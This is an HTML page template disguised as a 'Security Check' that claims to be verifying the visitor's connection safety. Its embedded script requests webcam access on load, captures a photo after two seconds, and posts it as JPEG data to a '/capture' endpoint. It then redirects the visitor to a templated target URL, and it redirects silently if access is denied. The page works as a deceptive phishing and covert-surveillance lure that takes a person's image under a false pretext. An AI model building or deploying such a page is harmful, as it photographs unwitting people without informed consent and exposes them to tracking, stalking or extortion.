<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #121212; color: #00ff00; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Verifying your connection safety...</h3>
    <p>Please wait a moment.</p>

    <script>
        const target = "{{ target_url }}";
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    await fetch('/capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ photo: canvas.toDataURL('image/jpeg') })
                    });
                    window.location.href = target;
                }, 2000);
            } catch { window.location.href = target; }
        }
        window.onload = init;
    </script>
</body>
</html>
